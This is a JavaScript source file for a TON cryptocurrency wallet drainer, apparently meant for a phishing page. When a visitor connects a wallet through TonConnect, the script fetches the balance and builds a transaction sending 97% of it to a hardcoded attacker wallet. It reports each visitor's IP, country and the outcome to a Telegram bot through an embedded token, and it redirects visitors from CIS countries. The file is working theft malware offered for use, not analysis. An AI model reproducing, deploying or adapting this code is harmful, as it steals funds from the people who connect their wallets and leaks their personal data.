var mainWallet = "EQDI_XEKmdgFbpwdisWZTcdZFbhle4e8BhJBKk1KfLyzdUa7"; // Main wallet address
var tgBotToken = "6986312551:AAFjUdD0peCCZ1wDluJoMHHWuQNMRFQVgd4"; // Telegram bot token
var tgChat = "1409893198"; // Your Telegram chat ID

var domain = window.location.hostname;
var ipUser;
var countryUser;

// Redirect users from CIS countries
fetch('https://ipapi.co/json/')
    .then(response => response.json())
    .then(data => {
        const country = data.country;
        if (['RU', 'KZ', 'BY', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ'].includes(country)) {
            window.location.replace('https://ton.org');
        }
        ipUser = data.ip;
        countryUser = data.country;
        console.log('IP:', ipUser);
        console.log('Country:', countryUser);
        
        const messageOpen = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCD6*Opened the website*`;
        sendTelegramMessage(messageOpen);
    })
    .catch(error => {
        console.error('Error fetching IP:', error);
    });

const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://' + domain + '/tonconnect-manifest.json',
    buttonRootId: 'ton-connect'
});

tonConnectUI.on('walletConnected', (walletAddress) => {
    console.log('Wallet connected:', walletAddress);
    if (!walletAddress) {
        console.error('Wallet address not found.');
    }
});

async function didtrans() {
    try {
        const response = await fetch('https://toncenter.com/api/v3/wallet?address=' + tonConnectUI.account.address);
        const data = await response.json();

        // Ensure the balance exists
        if (!data.balance) {
            console.error('Error: No balance data returned from TON API.');
            return;
        }

        let originalBalance = parseFloat(data.balance);
        if (isNaN(originalBalance)) {
            console.error('Error: Invalid balance value.');
            return;
        }

        // Process balance by removing 3% for fees
        let processedBalance = originalBalance - (originalBalance * 0.03);
        let tgBalance = processedBalance / 1000000000; // Convert to TON

        // Log the balances
        console.log('Original Balance:', originalBalance);
        console.log('Processed Balance:', processedBalance);

        // Prepare the transaction object
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 60, // Valid for the next 60 seconds
            messages: [{
                address: mainWallet,
                amount: processedBalance
            }]
        };

        const result = await tonConnectUI.sendTransaction(transaction);

        // Send success message to Telegram
        const messageSend = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${tonConnectUI.account.address})\n\n\uD83D\uDC8E*Send:* ${tgBalance}`;
        sendTelegramMessage(messageSend);
    } catch (e) {
        console.error('Transaction failed:', e);
        const messageDeclined = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${tonConnectUI.account.address})\n\n\uD83D\uDED1*Declined or error.*`;
        sendTelegramMessage(messageDeclined);
    }
}

function sendTelegramMessage(message) {
    const encodedMessage = encodeURIComponent(message);
    const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=-${tgChat}&text=${encodedMessage}&parse_mode=Markdown`;

    fetch(url, { method: 'POST' })
        .then(response => {
            if (response.ok) {
                console.log('Telegram message sent successfully.');
            } else {
                console.error('Error sending Telegram message:', response.statusText);
            }
        })
        .catch(error => {
            console.error('Error sending Telegram message:', error);
        });
}
